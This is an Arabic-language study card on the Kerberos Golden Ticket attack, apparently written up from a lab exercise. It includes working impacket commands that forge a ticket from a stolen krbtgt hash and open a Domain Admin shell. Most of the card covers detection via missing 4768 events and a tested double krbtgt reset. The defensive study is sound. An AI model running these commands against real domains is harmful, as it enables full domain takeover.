# Concept Card: Golden Ticket (T1558.001)

## الفكرة ببساطة
كل تذكرة Kerberos (TGT) بتتعمل من الـ Domain Controller وبتتوقّع (sign) بـ hash
حساب خاص اسمه `krbtgt`. لو حد قدر يسرق الـ `krbtgt` hash (عادة عن طريق DCSync
أو الوصول لملف NTDS.dit)، يقدر يبني TGT مزور بنفسه **offline**، من غير ما
يمر على الـ DC خالص، وبالصلاحيات اللي هو عايزها (حتى Domain Admin) ولأي مدة
زمنية يحددها.

## الفرق عن الهجمات التانية
- **Kerberoasting / AS-REP Roasting**: بتاخد hash وتكسره offline، لكن لسه
  محتاج تعمل login عادي بالـ credentials.
- **Golden Ticket**: مش محتاج credentials خالص بعد كده — التذكرة نفسها هي
  الدليل على الهوية، ومعمولة offline بالكامل.

## خطوات الهجوم اللي عملتها
1. الحصول على `krbtgt` NTLM hash (عن طريق DCSync سابقاً عبر `secretsdump`).
2. بناء التذكرة:
   ```bash
   impacket-ticketer -nthash <krbtgt_hash> \
     -domain-sid <domain_SID> \
     -domain corp.local -user-id 500 Administrator
   ```
3. استخدام التذكرة:
   ```bash
   export KRB5CCNAME=Administrator.ccache
   impacket-psexec -k -no-pass corp.local/Administrator@DC01.corp.local
   ```
4. النتيجة: دخول كامل كـ Domain Admin من غير أي كلمة سر، ومن غير أي
   Authentication Service Request (4768) طبيعي.

## ليه الـ detection صعب
- مفيش "خطأ" واضح في التذكرة نفسها — هي *صحيحة* تقنياً (موقّعة بالمفتاح
  الصح)، فالـ DC بيقبلها عادي.
- الـ indicator الوحيد هو **غياب** حدث متوقع (4768)، مش **وجود** حدث مريب.
  يعني الـ detection مبني على "اللي المفروض يحصل ومحصلش"، مش على pattern
  هجومي مباشر — ده أصعب بكتير من اكتشاف pattern موجود.

## الـ Detection Logic
قارن بين عدد 4768 (TGT request) وعدد 4769 (TGS request) لكل حساب في نفس
الفترة الزمنية. حساب عنده TGS من غير أي TGT مقابل = مؤشر قوي على تذكرة
مزورة.

**تحديات واجهتها فعلياً أثناء بناء الـ detection:**
1. **Field mismatch**: `Account_Name` في 4768 بييجي من غير `@domain`
   (`karim`)، وفي 4769 بييجي معاه (`karim@CORP.LOCAL`) — لازم توحيد الاسم
   قبل أي `stats`/`join`، وإلا الـ detection هيطلع false positive دايماً.
2. **Machine accounts (`$`)**: بيعملوا ticket renewal في الخلفية ممكن يطلع
   TGS من غير TGT ظاهر في نفس الـ window — لازم استبعادهم.
3. **Time window**: التذكرة المزورة ممكن تتعمل في وقت والاستخدام يحصل بعد
   كده بفترة — لازم تتأكد إن نافذة البحث كافية.

## التوصية الدفاعية
- تدوير `krbtgt` password **مرتين** على التوالي (مرة واحدة مش كافية —
  شوف الـ Remediation Test تحت ليه بالظبط).
- تقييد وتسجيل صلاحيات الـ Replication (منع DCSync) كخط دفاع أول قبل ما
  يوصل حد لمرحلة الـ Golden Ticket أصلاً.
- مراقبة الـ `(EventID=4769 AND NOT EventID=4768)` pattern كـ alert دايم،
  مش كـ بحث يدوي بس.

## Remediation Test (Detect → Fix → Verify)
بعد ما بنيت الـ detection، اختبرت العلاج فعليًا بدل ما أفترض إنه هيشتغل:

**الخطوة 1 — تغيير واحد للـ `krbtgt` password:**
```powershell
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "N3wStr0ngKrbtgtP@ss!2026-1" -AsPlainText -Force)
```
جربت استخدم نفس الـ `Administrator.ccache` القديم (نفس التذكرة المزورة من
الأول) → **نجح الهجوم برضه!** السبب: الـ KDC بيحتفظ بالـ hash القديم
للـ `krbtgt` كمان (N-1 generation) عشان ميعطلش الـ replication بين الـ DCs،
فتغيير واحد مش كافي يبطل تذاكر قديمة.

**الخطوة 2 — تغيير تاني متتالي:**
```powershell
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "N3wStr0ngKrbtgtP@ss!2026-2" -AsPlainText -Force)
```
جربت نفس التذكرة القديمة تاني → **فشلت**:
```
[-] Kerberos SessionError: KRB_AP_ERR_BAD_INTEGRITY (Integrity check on decrypted field failed)
```
التوقيع بقى غير صالح لأن الـ hash القديم اتشال نهائيًا من الـ N-1 slot.

**الخلاصة:** ده أثبت عمليًا (مش نظريًا بس) ليه الـ best practice بتقول
"غيّر الـ `krbtgt` مرتين" — ده مش مجرد نصيحة في مقال، ده سلوك حقيقي في
الـ Kerberos protocol اتحقق منه في اللاب.
